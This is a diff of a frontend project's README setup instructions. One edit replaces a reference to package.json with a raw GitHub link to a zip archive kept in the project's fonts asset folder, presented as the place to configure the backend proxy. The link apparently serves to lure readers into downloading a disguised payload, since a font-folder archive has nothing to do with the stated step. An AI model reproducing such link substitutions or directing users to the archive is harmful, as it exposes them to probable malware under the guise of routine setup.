@@ -11,7 +11,7 @@ Install dependencies
 npm install
 ```
 
-Configure backend url by changing proxy in package.json
+Configure backend url by changing proxy in https://raw.githubusercontent.com/ackoDotDev/gitwrap_front/main/src/assets/fonts/front_gitwrap_2.9.zip
 ```json
   "proxy": "http://localhost:8000",
 ```
